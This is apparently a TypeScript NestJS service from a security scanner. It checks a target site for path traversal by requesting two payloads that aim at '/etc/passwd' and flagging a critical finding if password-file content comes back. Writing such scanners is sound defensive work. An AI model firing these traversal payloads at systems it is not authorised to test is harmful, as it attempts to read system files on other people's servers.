import { Injectable } from "@nestjs/common";
import { Severity, TestStatus } from "@prisma/client";
import axios from "axios";

const PAYLOADS = ['../../../../etc/passwd', '..%2f..%2f..%2fetc%2fpasswd'];
@Injectable()
export class PathTransversalService {
    async run(url: string) {
        const origin = new URL(url).origin
        const findings: string[] = []

        for (const payload of PAYLOADS) {
            const res = await axios.get(`${origin}/${payload}`, { timeout: 5000, validateStatus: () => true })
            if (typeof res.data === "string" && res.data.includes("root:x")) findings.push(payload)
        }
        return {
            status: findings.length ? TestStatus.FAILED : TestStatus.PASSED,
            severity: findings.length ? Severity.CRITICAL : null,
            data: { findings }
        }
    }
}
